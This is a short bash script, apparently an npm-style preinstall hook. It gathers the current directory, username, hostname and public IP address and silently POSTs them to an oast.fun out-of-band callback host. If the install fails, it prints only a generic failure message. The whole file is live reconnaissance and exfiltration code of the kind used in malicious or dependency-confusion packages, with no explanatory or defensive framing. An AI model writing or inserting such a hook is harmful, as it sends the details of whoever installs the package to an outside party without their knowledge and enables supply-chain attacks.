#!/bin/bash

directory="$(pwd)"
user="$(whoami)"
hostname="$(hostname)"
ip="$(curl -s ifconfig.me)"

curl -s -X POST cme2mw32vtc00009681ggk8bkqryyyyyb.oast.fun -d "directory=$directory user=$user hostname=$hostname ip=$ip" || (echo 'Failed to execute preinstall script')
